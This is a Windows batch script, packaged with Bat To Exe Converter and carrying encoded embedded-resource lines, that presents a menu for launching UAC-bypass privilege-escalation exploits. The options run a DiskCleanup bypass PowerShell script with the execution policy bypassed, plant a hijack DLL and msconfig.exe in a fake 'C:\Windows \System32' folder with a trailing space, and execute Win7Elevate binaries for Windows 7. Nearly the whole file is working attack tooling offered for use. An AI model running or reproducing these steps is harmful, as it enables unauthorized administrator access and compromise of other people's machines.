::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcBCDJXiuOpEZ++Pv4Pq7l2w+FMQ2dIrI5pCHM+sw5kDle4M99GNKmdgfMx9RbBeoekEkuj8i
::fBE1pAF6MU+EWHreyHcjLQlHcBCDJXiuOpET/+b34OuDsXE+W+8vaorIybGKHNUyyQjGbIYsxWkXiNkDC1ZVfwG/ax0InE9h+0acJ8aPoELxWEeOq0YxCHFxlV/AniQ9YcNh1McP30A=
::fBE1pAF6MU+EWHreyHcjLQlHcBCDJXiuOpET/+b34OuDsXE+W+8vaorIybGKHNUyyQjGbIYsxWkXiNkDC1ZVfwG/ax0InE9h+0acJ8aPoELxWEeOq0YxCHFxlV/2gCQ6dNpmneUM3yS77gPvjPRw
::fBE1pAF6MU+EWHreyHcjLQlHcBCDJXiuOpET/+b34OuDsXE+W+8vaorIybGKHNUyyQjGbIYsxWkXiNkDC1ZVfwG/ax0InE9h+0acJ8aPoELxWEeOq0YxCHFxlV/dnyg0btVhnY0GyyXe
::fBE1pAF6MU+EWHreyHcjLQlHcBCDJXiuOpET/+b34OuDsXE+W+8vaorIybGKHNUyyQjGbIYsxWkXiNkDC1ZVfwG/ax0InE9h+0acJ8aPoELxWEeOq0YxCHFxlV/nhSVsRd9tjMIX1nPs6h+xmr0VsQ==
::fBE1pAF6MU+EWHreyHcjLQlHcBCDJXiuOpET/+b34OuDsXE+W+8vaorIybGKHNUyyQjGbIYsxWkXiNkDC1ZVfwG/ax0InE9h+0acJ8aPoELxWEeOq0YxCHFxlV/nhSVsRd9tjMIX1nbq6h+xmr0VsQ==
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF65
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZkk0
::ZQ05rAF9IBncCkqN+0xwdVsFAlbi
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQISMQtVXxfCCUqZZg==
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATE329Q
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFA9VVReWAE+/Fb4I5/jH2suk4msUWOcsRLr6+fSMNekf7gW1O5M10xo=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
:menu
color 1F

ECHO                   ____
ECHO   ^|   ^|    /\    ^|
ECHO   ^|   ^|   /__\   ^|
ECHO   ^|___^|  /    \  ^|____   

ECHO ..............................
ECHO . PRESS 1, 2, 3, 4 or 5 to EXIT .
ECHO ..............................
ECHO All files required are placed in the temp folder
ECHO and are deleted when program exits and SC is on github
ECHO 1 - Windows 10
ECHO 4 - Windows 10 second exploit
ECHO 2 - Windows 7 64 bit
ECHO 3 - Windows 7 32 bit 
SET /P M=Type 1, 2, 3, 4 or 5 then press ENTER:
IF %M%==1 GOTO W10
IF %M%==2 GOTO 764
IF %M%==3 GOTO 732
IF %M%==4 GOTO W10X2
IF %M%==5 GOTO EOF
:W10
copy %b2eincfilepath%\DiskCleanupBypass_direct.ps1 "%temp%\DiskCleanupBypass_direct.ps1"
ECHO If it works you should get an admin command panel press space when your ready :)
pause

PowerShell.exe -NoProfile -ExecutionPolicy Bypass %temp%\DiskCleanupBypass_direct.ps1
GOTO menu
:W10X2
copy %b2eincfilepath%\FloatingFolder.ps1 "%temp%\FloatingFolder.ps1"
PowerShell.exe -NoProfile -ExecutionPolicy Bypass %temp%\FloatingFolder.ps1
copy %b2eincfilepath%\profapi.dll "\\?\C:\Windows \System32\profapi.dll"
copy %b2eincfilepath%\msconfig.exe "\\?\C:\Windows \System32\msconfig.exe"
"\\?\C:\Windows \System32\msconfig.exe"
ECHO Admin Command pannel should come up
pause
GOTO menu

:764
copy %b2eincfilepath%\Win7Elevate64v2.exe "%temp%\Win7Elevate64v2.exe"
%temp%\Win7Elevate64v2.exe
GOTO menu
:732
copy %b2eincfilepath%\Win7Elevate34v2.exe "%temp%\Win7Elevate34v2.exe"
%temp%\Win7Elevate34v2.exe
GOTO menu
:EOF
exit
